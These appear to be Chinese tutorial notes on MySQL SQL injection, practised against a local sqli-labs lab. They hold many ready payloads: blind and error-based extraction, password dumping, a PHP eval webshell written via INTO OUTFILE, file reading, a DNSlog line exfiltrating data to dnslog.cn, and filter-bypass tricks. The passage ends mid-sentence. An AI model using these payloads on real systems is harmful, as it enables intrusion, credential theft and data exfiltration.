information_schema\u6570\u636e\u5e93\u4e2d\u7684tables\u8868\u662f\u6574\u4e2aMySQL\u6570\u636e\u5e93\u8868\u540d\u7684\u6c47\u603b\u3002columns\u8868\u662f\u6574\u4e2aMySQL\u6570\u636e\u5e93\u5217\u7684\u6c47\u603b\u3002 \u53ef\u4ee5\u5229\u7528information_schema.tables\u548cinformation_schema.columns\u6765\u8fdb\u884c\u7b1b\u5361\u5c14\u7b97\u79ef\uff0c\u9020\u6210\u5927\u8d1f\u8377\u67e5\u8be2\uff0c\u4ee5\u81f3\u4e8e\u8fbe\u5230\u5ef6\u65f6\u7684\u6548\u679c\u3002 select * from users where id=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B); 0.44 sec select * from users where id=1 and (SELECT count(*) FROM information_schema.tables A, information_schema.columns B); 0.11 sec select * from users where id=1 and (SELECT count(*) FROM information_schema.tables A, information_schema.tables B); 0.02 sec \u914d\u5408\u67e5\u8be2\u8bed\u53e5\u4e00\u8d77\uff0c\u5982\u679c\u8981\u67e5\u8be2\u7684\u7ed3\u679c\u4e3a\u771f\uff0c\u5219\u4f1a\u9020\u6210\u5ef6\u65f6\u5e76\u663e\u793a\u6570\u636e\u3002\u5982\u679c\u8981\u67e5\u8be2\u7684\u7ed3\u679c\u4e3a\u5047\uff0c\u5219\u4e0d\u4f1a\u4ea7\u751f\u5ef6\u65f6\u5e76\u4e14\u4e0d\u4f1a\u663e\u793a\u6570\u636e select*from users where id=1 and (ascii(substr(database(),1,1))>100) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B); GET_LOCK() \u00b6 get_lock(str,timeout) \u5bf9\u4e00\u4e2a\u5b57\u7b26\u4e0a\u9501,\u5728\u65b0\u56de\u8bdd\u5f00\u542f\u540e,\u518d\u6b21\u4f7f\u7528\u8fd9\u4e2a\u5b57\u7b26\u4f1a\u6709\u5ef6\u65f6 RLIKE REGEXP\u6b63\u5219\u5339\u914d \u00b6 \u901a\u8fc7 rpad \u6216 repeat \u6784\u9020\u957f\u5b57\u7b26\u4e32\uff0c\u52a0\u4ee5\u8ba1\u7b97\u91cf\u5927\u7684pattern\uff0c\u901a\u8fc7repeat\u7684\u53c2\u6570\u53ef\u4ee5\u63a7\u5236\u5ef6\u65f6\u957f\u77ed\u3002 select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b'); \u5bbd\u5b57\u8282\u6ce8\u5165 \u00b6 \u5b58\u5728\u4f7f\u7528 preg_replace() \u3001 addslashes() \u3001 mysqli_real_escape_string() \u3001 get_magic_quotes_gpc() \u7b49\u51fd\u6570\u52a0\u5165 \\ \u8f6c\u4e49\uff0c\u5e76\u4e14\u7f16\u7801\u8bbe\u7f6e\u4e3agbk\uff0c\u53ef\u4ee5\u8003\u8651\u662f\u5426\u5b58\u5728\u5bbd\u5b57\u8282\u6ce8\u5165 preg_replace() \u51fd\u6570\u9700\u8981\u81ea\u5b9a\u4e49\u8f6c\u4e49\u66ff\u6362\u54ea\u4e9b\u5b57\u7b26 addslashes() \u51fd\u6570\u8fd4\u56de\u5728\u9884\u5b9a\u4e49\u7684\u5b57\u7b26\uff08\u5355\u5f15\u53f7\uff08'\uff09\u3001 \u53cc\u5f15\u53f7\uff08\"\uff09\u3001 \u53cd\u659c\u6760\uff08\\\uff09\u3001 NULL\uff09\u524d\u6dfb\u52a0\u53cd\u659c\u6760\u7684\u5b57\u7b26\u4e32 mysqli_real_escape_string() \u51fd\u6570\u8f6c\u4e49\u5728 SQL \u8bed\u53e5\u4e2d\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u3002(\u7f16\u7801\u7684\u5b57\u7b26\u662f NUL\uff08ASCII 0\uff09\u3001\\n\u3001\\r\u3001\\\u3001'\u3001\" \u548c Control-Z) get_magic_quotes_gpc() \u5c06post\u3001get\u3001cookie\u8fc7\u6765\u7684\u6570\u636e\u589e\u52a0\u8f6c\u4e49\u5b57\u7b26 \\ \uff0c\u8fc7\u6ee4\u7684\u6570\u636e\u6709\u5355\u5f15\u53f7(')\u3001\u53cc\u5f15\u53f7(\")\u3001\u53cd\u659c\u6760()\u4e0eNULL(NULL\u5b57\u7b26) \u6b64\u7f16\u7801\u683c\u5f0f \u4e24\u4e2a\u5b57\u8282 \u4ee3\u8868 \u4e00\u4e2a\u6c49\u5b57 \u6211\u4eec\u8f93\u5165\u5355\u5f15\u53f7 ' \uff0c\u540e\u7aef\u6dfb\u52a0\u8f6c\u4e49\u7b26\u53f7\uff0c \\ \u7684GBK16\u8fdb\u5236\u7f16\u7801\u4e3a %5c \uff0c ' \u7684GBK16\u8fdb\u5236\u7f16\u7801\u4e3a %27 \uff0c\u8fd9\u662f\u6b63\u5e38\u8f6c\u4e49\u6d41\u7a0b \u4f46\u662f\u6211\u4eec\u524d\u7aef\u4f20\u503c\u4e3a %df' \uff0c\u62fc\u63a5\u4e0a\u8f6c\u4e49\u7684\u7f16\u7801 %df%5c \u662f\u7e41\u4f53\u5b57 \u904b \uff0c\u6211\u4eec\u7528\u8fd9\u79cd\u65b9\u6cd5\u6765\u4e0e \\ \u62fc\u6210\u65b0\u7684\u5b57\u7b26\uff0c\u4ee5\u6b64\u6765\u7ed5\u8fc7\u540e\u7aef\u8f6c\u4e49 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020payload -1%df' union select 1,2,3 -- - SELECT * FROM users WHERE id='-1\u904b' union select 1,2,3 -- -' LIMIT 0,1 \u4e8c\u6b21\u6ce8\u5165 \u00b6 \u6ce8\u518c\u65f6\u7279\u6b8a\u6784\u9020\u7528\u6237\u540d\u5199\u5165\u6570\u636e\u5e93\uff0c\u518d\u5229\u7528update\u91cd\u7f6e\u65f6\u6ca1\u6709\u8f6c\u4e49\u9020\u6210sql\u62fc\u63a5\u6ce8\u5165 \u53ef\u8f93\u5165\u53c2\u6570\u7684\u5730\u65b9\uff1a\uff08\u767b\u5f55\u9875\u9762\u548c\u6ce8\u518c\u9875\u9762\u5bf9\u4e8e\u5bc6\u7801\u548c\u8d26\u6237\u540d\u90fd\u4f7f\u7528mysql_real_escape_string\u51fd\u6570\u5bf9\u4e8e\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\uff09 \u767b\u5f55\u8f93\u5165\u3010\u7528\u6237\u540d\u3011\u3010\u5bc6\u7801\u3011 SELECT * FROM users WHERE username='$username' and password='$password' \u4fee\u6539\u5bc6\u7801\u8f93\u5165\u3010\u73b0\u5bc6\u7801\u3011\u3010\u65b0\u5bc6\u7801\u3011\u3010\u91cd\u590d\u65b0\u5bc6\u7801\u3011 UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \u6ce8\u518c\u8f93\u5165\u3010\u7528\u6237\u540d\u3011\u3010\u5bc6\u7801\u3011 insert into users (username, password) values(\\\"$username\\\", \\\"$pass\\\") \u6211\u4eec\u53ea\u9700\u8981\u6ce8\u518c\u4e2a\u8d26\u53f7\u53eb \u8d26\u53f7\uff1aadmin'# \u5bc6\u7801\uff1a123 \u767b\u5f55\u540e\u4fee\u6539\u5bc6\u7801 new password\uff1aabc retype password\uff1aabc \u6784\u9020\u6210\u7684\u67e5\u8be2\u8bed\u53e5 UPDATE users SET PASSWORD='abc' where username='admin'#' and password='123' admin\u7684\u5bc6\u7801\u5373\u88ab\u91cd\u7f6e\u4e3aabc\u4e86 \u5806\u53e0\u6ce8\u5165 \u00b6 mysqli_multi_query() \u51fd\u6570\u6267\u884c\u4e00\u4e2a\u6216\u591a\u4e2a\u9488\u5bf9\u6570\u636e\u5e93\u7684\u67e5\u8be2\u3002\u533a\u522b\u4e8e`mysqli_query()`` mysqli_store_result \u8f6c\u79fb\u4e0a\u4e00\u6b21\u67e5\u8be2\u8fd4\u56de\u7684\u7ed3\u679c\u96c6 mysqli_fetch_row() \u51fd\u6570\u4ece\u7ed3\u679c\u96c6\u4e2d\u53d6\u5f97\u4e00\u884c\uff0c\u5e76\u4f5c\u4e3a\u679a\u4e3e\u6570\u7ec4\u8fd4\u56de mysqli_more_results() \u51fd\u6570\u68c0\u67e5\u4e00\u4e2a\u591a\u67e5\u8be2\u662f\u5426\u6709\u66f4\u591a\u7684\u7ed3\u679c\u3002 \u5173\u952e\u70b9\u5c31\u5728\u8fd9\u4e2a mysqli_multi_query() \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u6267\u884c\u591a\u6761SQL\u8bed\u53e5\uff0c\u4ee5\u81f3\u4e8e\u6211\u4eec\u53ef\u4ee5 \u5806\u53e0\u6ce8\u5165 \uff0c\u8f93\u5165\u591a\u6761\u67e5\u8be2\u8bed\u53e5\uff08\u4ee5 ; \u4e3a\u95f4\u9694\u7b26\uff09 \u5806\u53e0\u6ce8\u5165\u600e\u4e48\u6d4b? \u95ed\u5408\u540e\u52a0\u4e2a ; \u4e0d\u62a5\u9519\uff0c\u5e94\u8be5\u5c31\u662f\u53ef\u4ee5\u5806\u53e0\u6ce8\u5165 1';insert into users(id,username,password) values ('20','123','123')-- - order by\u6ce8\u5165 \u00b6 \u6570\u5b57\u578b\u6ce8\u5165 \u00b6 $sql=\"SELECT * FROM users ORDER BY $id\"; sql\u8bed\u53e5\u53c2\u6570\u6ca1\u6709\u5f15\u53f7\u4e14\u4e0d\u80fd\u4f7f\u7528\u8054\u5408\u6ce8\u5165\uff0c\u6709\u62a5\u9519\u663e\u793a\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528updatexml\u8fdb\u884c\u62a5\u9519 \u56e0\u4e3a \u62a5\u9519\u51fd\u6570\u663e\u793a\u5b57\u7b26\u4f4d\u6570\u6709\u9650\uff0c\u6700\u957f\u662f32\u4f4d \uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5 limit\u9010\u884c\u8f93\u51fa substr\u622a\u53d6\u5b57\u7b26\u4e32(\u622a\u53d6\u65f6\u5019\u628a\u63e1\u572832\u4f4d\u4ee5\u5185) ?sort=1 and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),30,30)),0) //XPATH syntax error: '~mysql,omg,performance_schema,s' \u5b57\u7b26\u578b\u6ce8\u5165 \u00b6 $sql = \"SELECT * FROM users ORDER BY '$id'\"; order by\u540e\u9762\u8ddf**\u6570\u5b57**\u6216**\u5b57\u6bb5\u540d**\uff0c\u5355\u5f15\u53f7\u95ed\u5408\u7684\u53ea\u80fd\u8ddf\u5b57\u6bb5\u540d\u4e86 \u82e5\u586b\u5199\u5176\u4ed6\u5b57\u7b26\uff0c\u5219\u9ed8\u8ba4\u6309\u7b2c\u4e00\u5217\u6392\u5e8f ?sort=1' and updatexml(1,concat(0x7e,substr((select group_concat(username,'~',password) from users),1,30)),0) and '1 //XPATH syntax error: '~Dumb~Dumb,Angelina~I-kill-you,' \u5e03\u5c14\u76f2\u6ce8 \u00b6 \u4e0d\u56de\u663e\u62a5\u9519\u4fe1\u606f\u7684\u8bdd\uff0c\u9488\u5bf9\u6570\u5b57\u578bsql\u8bed\u53e5\u53ea\u80fd\u4f7f\u7528**order by rand()\u5e03\u5c14\u76f2\u6ce8\uff1a** \u6211\u4eec\u8003\u8651\u7684\u70b9\u5e94\u8be5\u662f\u600e\u4e48\u627e\u5230\u5e03\u5c14\u76f2\u6ce8\u7684 0 \u548c 1 \u8fd9\u65f6\u5019\u7528\u5230 rand() \u51fd\u6570\u4e86\uff0c\u914d\u5957 order by \u4f7f\u7528\u6548\u679c\u5982\u4e0b $sql=\"SELECT * FROM users ORDER BY $id\"; order by rand(false) order by rand(true) \u4e24\u79cd\u6392\u5e8f\u540e\u7684\u7ed3\u679c\u4e0d\u540c\uff0c\u4e5f\u5c31\u80fd\u5224\u65ad\u51fasql\u8bed\u53e5\u7684\u5e03\u5c14\u503c\u4e86 ?sort=rand(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=0) //\u8fd4\u56de\u9519\u8bef\u7684\u90a3\u79cd\u6392\u5e8f\u7ed3\u679c ?sort=rand(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105) //\u8fd4\u56de\u6b63\u786e\u7684\u90a3\u79cd\u6392\u5e8f\u7ed3\u679c \u65f6\u95f4\u76f2\u6ce8 \u00b6 \u4e0d\u56de\u663e\u62a5\u9519\u4fe1\u606f\u7684\u8bdd\uff0c\u9488\u5bf9\u5b57\u7b26\u578bsql\u8bed\u53e5\u53ea\u80fd\u4f7f\u7528**order by rand()\u65f6\u95f4\u76f2\u6ce8\uff1a** ?sort=1' and if(1=1,sleep(0.05),null) and '0 SELECT * FROM users ORDER by '1' and if(1=1,sleep(0.1),null) and '0' \u5f53 order by \u540e\u9762\u7684\u503c\u662f\u6b63\u786e\u7684\u65f6\u5019\u624d\u4f1a\u6267\u884c\u540e\u9762\u7684 if \u8bed\u53e5 order by \u7684\u904d\u5386\u673a\u5236\u662f**\u904d\u5386\u6240\u6709\u884c**\uff0c\u6240\u4ee5\u6bcf\u6709\u4e00\u884c\uff0csleep()\u5c31\u4f1a\u6267\u884c\u4e00\u6b21\uff0c\u6240\u4ee5\u8fd9\u4e2asleep()\u7684\u503c\u4e0d\u8981\u592a\u5927 1' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105,sleep(0.1),null) and '1 \u7ea6\u675f\u653b\u51fb \u00b6 insert\u8bed\u53e5\u4f1a\u6839\u636evarchar(n)\u6765\u9650\u5236\u5b57\u7b26\u4e32\u6700\u5927\u957f\u5ea6 \u5982\u679c\u6211\u4eec\u6ce8\u518c admin 1 \u7684\u7528\u6237\uff0csql\u56de\u5148\u6267\u884cselect\u770b\u6709\u6ca1\u6709 admin 1 \u8fd9\u4e2a\u7528\u6237 \u53d1\u73b0\u6ca1\u6709\uff0c\u7136\u540e\u63d2\u5165\u6570\u636e\uff0c\u53d1\u751f\u4e86\u622a\u65ad\uff0c\u53ea\u80fd\u63d2\u5165\u524d5\u4f4d\uff0c\u5bf9\u5e94\u5b57\u6bb5\u5c31\u591a\u4e86\u4e00\u4e2a\u503c\u4e3a admin \u7684\u884c\uff0c\u7136\u540e\u4efb\u610f\u767b\u5f55 \u5229\u7528\u65b9\u6cd5 \u00b6 information_schema\u5957\u8def \u00b6 http://localhost/sqli/Less-1/?id=1' and '1'='1 \u5bf9\u5e94\u7684\u67e5\u8be2\u8bed\u53e5 SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1 //\u8fd4\u56de\u6b63\u786e\u9875\u9762 http://localhost/sqli/Less-1/?id=1' and '1'='2 \u5bf9\u5e94\u7684\u67e5\u8be2\u8bed\u53e5 SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1 //\u8fd4\u56de\u7a7a\u503c \u7136\u540e\u5224\u65ad\u5b57\u6bb5\u6570\u91cf http://localhost/sqli/Less-1/?id=1' order by 3 -- - //\u9875\u9762\u6b63\u5e38\u663e\u793a SELECT * FROM users WHERE id='1' ORDER BY 3 -- -' LIMIT 0,1 http://localhost/sqli/Less-1/?id=1' order by 4 -- - //\u62a5\u95191054 - Unknown column '4' in 'order clause' SELECT * FROM users WHERE id='1' ORDER BY 4 -- -' LIMIT 0,1 \u4ee5\u6b64\u53ef\u63a8\u65ad\u5b57\u6bb5\u6570\u4e3a3\u4e2a \u7136\u540e**\u67e5\u770b\u9875\u9762\u663e\u793a\u7684\u5b57\u6bb5\u6709\u54ea\u4e9b** http://localhost/sqli/Less-1/?id=1' union select 1,2,3 -- - SELECT * FROM users WHERE id='0' union select 1,2,3 -- -' LIMIT 0,1 //\u8fd9\u65f6\u5019id\u8981\u4e48\u7ed9\u9519\u8bef\u503c\u3001\u8981\u4e48\u4e3a\u7a7a\uff0c\u4e0d\u7136\u56e0\u4e3a\u662f\u8054\u5408\u67e5\u8be2\u8fd8\u662f\u4f1a\u8f93\u51fa\u8d26\u53f7\u5bc6\u7801 \u53ef\u4ee5\u770b\u5230\u9875\u9762\u663e\u793a\u51fa\u4e3a\u5b57\u6bb5**2,3** \u663e\u793a\u6570\u636e\u5e93\u540d\u548c\u767b\u5f55\u7528\u6237 http://localhost/sqli/Less-1/?id=0' union select 1,DATABASE(),USER() -- - SELECT * FROM users WHERE id='0' union select 1,DATABASE(),USER() -- -' LIMIT 0,1 \u67e5\u770b\u6570\u636e\u5e93\u7684\u6240\u6709\u8868 http://localhost/sqli/Less-1/?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3 -- - SELECT * FROM users WHERE id='0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3 -- -' LIMIT 0,1 \u67e5\u8be2\u8868\u4e0b\u7684\u6240\u6709\u5b57\u6bb5 http://localhost/sqli/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users' ),3 -- - SELECT * FROM users WHERE id='0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users' ),3 -- -' LIMIT 0,1 \u67e5\u8be2\u6240\u6709\u7528\u6237\u540d\u7528\u6237\u540d\u5bc6\u7801 http://localhost/sqli/Less-1/?id=0' union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- - SELECT * FROM users WHERE id='0' union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -' LIMIT 0,1 concat_ws() \u51fd\u6570\u662f\u4e00\u4e2a\u62fc\u63a5\u5b57\u7b26\u4e32\u51fd\u6570\uff0c\u95f4\u9694\u7b26\u4f7f\u7528**0x7e**\uff0c\u4ee3\u8868\u7684\u662f ~ \u7b26\u53f7 into oufile\u5199shell \u00b6 \u5c1d\u8bd5\u6267\u884cinto outfile\u53d1\u73b0\u62a5\u9519 show variables like '%secure%'; \u5176\u4e2d\u6709\u4e2asecure-file-priv\u53c2\u6570\uff1a secure_file_priv\u7684\u503c\u4e3anull \uff0c\u8868\u793a\u9650\u5236mysqld\u4e0d\u5141\u8bb8\u5bfc\u5165|\u5bfc\u51fa secure_file_priv\u7684\u503c\u4e3a/tmp/ \uff0c\u8868\u793a\u9650\u5236mysqld\u7684\u5bfc\u5165|\u5bfc\u51fa\u53ea\u80fd\u53d1\u751f\u5728/tmp/\u76ee\u5f55\u4e0b secure_file_priv\u7684\u503c\u6ca1\u6709\u5177\u4f53\u503c\u65f6\uff0c\u8868\u793a\u4e0d\u5bf9mysqld\u7684\u5bfc\u5165|\u5bfc\u51fa\u505a\u9650\u5236 \u6211\u4eec\u9700\u8981\u624b\u52a8\u4fee\u6539my.ini\u6587\u4ef6\u4e2dsecure-file-priv\u7684\u503c\u4e3a\u7a7a secure_file_priv= \uff0c\u91cd\u542fmysql \u5199\u5165\u4e00\u53e5\u8bdd\uff1a ')) union select \" <?php @ eval ( $_POST [ 'sql' ]); ?> \" into outfile '\u8def\u5f84' http://127.0.0.1/sqlilabs2/Less-7/index.php?id=-1')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile \"E:\\softs\\phpstudy_pro\\WWW\\sqlilabs2\\Less-7\\mm2.php\"--+ \u5199\u5165\u9700\u8981\u6ce8\u610f\u7684\uff1a \u5199\u5165\u7684\u5185\u5bb9\u9700\u8981\u7528hex\u8f6c\u7801\uff0c\u4ee5\u9632\u62e6\u622a \u5199\u5165\u7684\u524d\u63d0\u9700\u8981\u77e5\u9053\u7269\u7406\u6587\u4ef6\u8def\u5f84 \u5199\u5165\u7684\u524d\u63d0\u662f\u6709\u6743\u9650\u5199\u5165\uff0c\u6216\u8005\u6709\u914d\u7f6e\u5199\u5165\u7684\u6743\u9650 load_file\u8bfb\u6587\u4ef6 \u00b6 ?id=1'and 1=2 union select 1,load_file('D:\\\\wamp\\\\www\\\\111.php')%23 ?id=1'and 1=2 union select 1,load_file(0x443A2F77616D702F7777772F312E706870)%23 MySQL DNSlog\u76f2\u6253 \u00b6 \u524d\u63d0\u6761\u4ef6\u4f9d\u65e7\u662fmysql.ini\u4e2dsecure_file_priv\u5fc5\u987b\u4e3a\u7a7a ' and if((select load_file(concat('\\\\\\\\',(select database()),'.4s1b2n.dnslog.cn'))),1,0)--+ \u653b\u51fb\u8005 --\u53d1\u9001payload\u2013>web\u670d\u52a1\u5668---->\u6570\u636e\u5e93(\u89e3\u6790load file\u51fd\u6570)---->\u6839\u636e\u8bed\u53e5\u5305\u542b\u7684\u57df\u540d\u8bbf\u95ee\u672c\u5730dns\u670d\u52a1\u5668\u2013\u4e0d\u80fd\u89e3\u6790\u53d1\u9001\u5230\u2013>\u516c\u7f51\u4e0adns\u670d\u52a1\u5668\u89e3\u6790\u2013\u89e3\u6790\u5b8c\u6210\u540e\u2013>dns\u672c\u5730\u670d\u52a1\u5668---->\u653b\u51fb\u8005\u670d\u52a1\u5668 \u56e0\u4e3a\u5728\u6570\u636e\u5e93\u4e2d\u5df2\u7ecf\u628a\u8981\u6267\u884c\u7684\u547d\u4ee4\u5e26\u5165\u5230dns\u89e3\u6790\u4e2d\u53bb\u4e86\uff0cdns\u670d\u52a1\u5668\u518d\u53d1\u9001\u7ed9\u653b\u51fb\u8005\u670d\u52a1\u5668\uff0c\u5c31\u53ef\u4ee5\u641c\u5230\u524d\u7f00\uff0c\u524d\u7f00\u5c31\u662f\u6211\u4eec\u60f3\u5f97\u5230\u7684\u4fe1\u606f\u3002 \u8fc7\u6ee4\u7ed5\u8fc7 \u00b6 \u8fc7\u6ee4\u4e86\u7a7a\u683c \u00b6 **\u6ce8\u91ca\u7b26**\u7ed5\u8fc7\uff1a \u5982\u679c\u53ea\u8fc7\u6ee4\u4e86\u7a7a\u683c\uff0c\u6ca1\u6709\u8fc7\u6ee4 /* \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528 /**/ \u6765\u7ed5\u8fc7\u7a7a\u683c\u8fc7\u6ee4\uff0cSqlmap\u4f7f\u7528\u547d\u4ee4: --tamper=space2comment.py **\u5185\u8054\u6ce8\u91ca**\u7ed5\u8fc7\uff1a \u5f53MySQL\u6570\u636e\u5e93\u7248\u672c\u5927\u4e8e\u7b49\u4e8e5.55.55\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u5185\u8054\u6ce8\u91ca /!**/ \uff0c\u5982\uff1a /*!union*/ \u3001 /*!select*/ \u6216 /*!50000union*/ \u7b49 Sqlmap\u4e2d\u5173\u4e8e\u5185\u8054\u6ce8\u91ca\u7684\u811a\u672c\uff1aversionedmorekeywords.py \u548c halfversionedmorekeywords.py **\u53cc\u7a7a\u683c**\u7ed5\u8fc7\uff1a \u7528**\u62ec\u53f7**\u7ed5\u8fc7\uff1a 'and(updatexml(1,concat(0x7e,database()),1))and'1'='1 \u7528**\u56de\u8f66**\u7ed5\u8fc7\uff1aascii\u7801\u4e3achr(13)&chr(10)\uff0curl\u7f16\u7801\u4e3a%0d%0a \u7528**\u6362\u884c\u7b26**\u7ed5\u8fc7\uff1aurl\u7f16\u7801\u4e3a%0a \u533a\u5206\u5927\u5c0f\u5199\u8fc7\u6ee4\u4e86SQL\u5173\u952e\u8bcd \u00b6 function blacklist($id) { $id = preg_replace('/[\\s]/',\"\",$id); //\u8fc7\u6ee4 \u7a7a\u683c %20 $id = preg_replace('/or/',\"\",$id); //\u8fc7\u6ee4 or $id = preg_replace('/and/',\"\",$id); //\u8fc7\u6ee4 and $id = preg_replace('/union/',\"\",$id); //\u8fc7\u6ee4 union $id = preg_replace('/by/',\"\",$id); //\u8fc7\u6ee4 by $id = preg_replace('/select/',\"\",$id); //\u8fc7\u6ee4 select $id = preg_replace('/from/',\"\",$id); //\u8fc7\u6ee4 from $id = preg_replace('/floor/',\"\",$id); //\u8fc7\u6ee4 floor $id = preg_replace('/concat/',\"\",$id); //\u8fc7\u6ee4 concat $id = preg_replace('/count/',\"\",$id); //\u8fc7\u6ee4 count $id = preg_replace('/rand/',\"\",$id); //\u8fc7\u6ee4 rand $id = preg_replace('/group by/',\"\",$id); //\u8fc7\u6ee4 group by $id = preg_replace('/substr/',\"\",$id); //\u8fc7\u6ee4 substr $id = preg_replace('/ascii/',\"\",$id); //\u8fc7\u6ee4 ascii $id = preg_replace('/mid/',\"\",$id); //\u8fc7\u6ee4 mid $id = preg_replace('/like/',\"\",$id); //\u8fc7\u6ee4 like $id = preg_replace('/sleep/',\"\",$id); //\u8fc7\u6ee4 sleep $id = preg_replace('/when/',\"\",$id); //\u8fc7\u6ee4 when $id = preg_replace('/order/',\"\",$id); //\u8fc7\u6ee4 order return $id; } \u7531\u4e8e\u8fd9\u91cc\u8fc7\u6ee4\u5e76\u6ca1\u6709\u533a\u5206\u5927\u5c0f\u5199\uff0c\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5**\u5927\u5c0f\u5199\u7ed5\u8fc7** sqlmap \u4e2d\u4e5f\u6709\u4e13\u95e8\u7684\u968f\u673a\u5927\u5c0f\u5199\u7684\u7ed5\u8fc7\u811a\u672c randomcase.py \u4e0d\u533a\u5206\u5927\u5c0f\u5199\u8fc7\u6ee4\u4e86SQL\u5173\u952e\u8bcd \u00b6 function blacklist($id) { $id = preg_replace('/[\\s]/',\"\",$id); //\u8fc7\u6ee4 \u7a7a\u683c %20 $id = preg_replace('/or/i',\"\",$id); //\u8fc7\u6ee4 or $id = preg_replace('/and/i',\"\",$id); //\u8fc7\u6ee4 and $id = preg_replace('/union/i',\"\",$id); //\u8fc7\u6ee4 union $id = preg_replace('/by/i',\"\",$id); //\u8fc7\u6ee4 by $id = preg_replace('/select/i',\"\",$id); //\u8fc7\u6ee4 select $id = preg_replace('/from/i',\"\",$id); //\u8fc7\u6ee4 from $id = preg_replace('/floor/i',\"\",$id); //\u8fc7\u6ee4 floor $id = preg_replace('/count/i',\"\",$id); //\u8fc7\u6ee4 count $id = preg_replace('/rand/i',\"\",$id); //\u8fc7\u6ee4 rand $id = preg_replace('/group by/i',\"\",$id); //\u8fc7\u6ee4 group by $id = preg_replace('/substr/i',\"\",$id); //\u8fc7\u6ee4 substr $id = preg_replace('/ascii/i',\"\",$id); //\u8fc7\u6ee4 ascii $id = preg_replace('/mid/i',\"\",$id); //\u8fc7\u6ee4 mid $id = preg_replace('/like/i',\"\",$id); //\u8fc7\u6ee4 like $id = preg_replace('/sleep/i',\"\",$id); //\u8fc7\u6ee4 sleep $id = preg_replace('/when/i',\"\",$id); //\u8fc7\u6ee4 when $id = preg_replace('/order/i',\"\",$id); //\u8fc7\u6ee4 order return $id; } \u7b2c\u4e00\u5c1d\u8bd5**\u53cc\u5199\u7ed5\u8fc7** sqlmap \u4e2d\u53cc\u62fc\u7ed5\u8fc7\u7684\u811a\u672c nonrecursivereplacement.py \u7b2c\u4e8c\u770b\u662f\u5426\u6709\u5173\u952e\u8bcd\u6f0f\u8fc7\u6ee4\u4e86\uff08 \u8fc7\u6ee4\u7f3a\u5931 \uff09 \u4f7f\u7528SQL\u5173\u952e\u8bcd\u6765\u8fdb\u884cfuzz\uff0c\u770b\u770b\u54ea\u4e9b\u5173\u952e\u8bcd\u6ca1\u6709\u88ab\u8fc7\u6ee4\uff08\u540e\u7eed\u8865\u5145\uff09 where select from floor concat count rand group by extractvalue limit updatexml join exp left right substr ascii mid ord regexp rlike like sleep if length benchmark information_schema get_lock rpad load_file case \u7b2c\u4e09\u5c31\u662f\u4f7f\u7528**\u7b49\u4ef7\u51fd\u6570\u66ff\u6362** substr \u3001substring \u3001mid \u90fd\u8fc7\u6ee4\u4e86\u7684\u8bdd\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 left() sleep \u53ef\u4ee5\u7528 benchmark() \u66ff\u6362 group_concat \u53ef\u4ee5\u4f7f\u7528 concat_ws()\u66ff\u6362 \u7528 /**/ \uff0c <> \u6765**\u5206\u5272\u5173\u952e\u5b57** sel<>ect sel/**/ect \u8fc7\u6ee4\u4e86\u5f15\u53f7 \u00b6 **16\u8fdb\u5236\u7f16\u7801**\u7ed5\u8fc7\uff1a select * from test where username='admin'; select * from test where username=\"admin\"; \u5f53\u5f15\u53f7\u88ab\u8fc7\u6ee4\u4e86\u7684\u8bdd\uff0c 'admin' \u6216\u8005 \"admin\" \u5c31\u6ca1\u6cd5\u7528\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 admin \u768416\u8fdb\u5236 0x61646d696e \u4ee3\u66ff select*from users where username=0x61646d696e; \u6ce8\uff1a\u4e2d\u6587\u65e0\u6cd5\u4f7f\u752816\u8fdb\u5236\u7f16\u7801\u7ed5\u8fc7 **ASCII\u7f16\u7801**\u7ed5\u8fc7\uff1a admin\u7684\u5404\u4e2a\u5b57\u7b26\u7684ascii\u503c\u4e3a\uff1a97-100-109-105-110 \u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528concat(char(97),char(100),char(109),char(105),char(110)) \u6765\u4ee3\u66ffadmin **URL\u7f16\u7801**\u7ed5\u8fc7(\u6709\u6761\u4ef6)\uff1a \u524d\u63d0\u5c31\u662f\uff0c\u540e\u7aef\u5728\u5904\u7406\u63a5\u6536\u7684\u53c2\u6570\u65f6\u5bf9\u8be5\u53c2\u6570\u8fdb\u884c\u4e86URL\u89e3\u7801\uff0c\u5e76\u4e14\u8be5URL\u89e3\u7801\u662f\u5728\u8fc7\u6ee4\u51fd\u6570\u4e4b\u540e\u624d\u53ef\u4ee5\u3002 $username=$_GET['username']; $username=blacklist($username); #\u8fc7\u6ee4\u51fd\u6570 $username=urldecode($username); #URL\u89e3\u7801 \u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 \" \u7684 URL\u7f16\u7801 \u7684 URL\u7f16\u7801 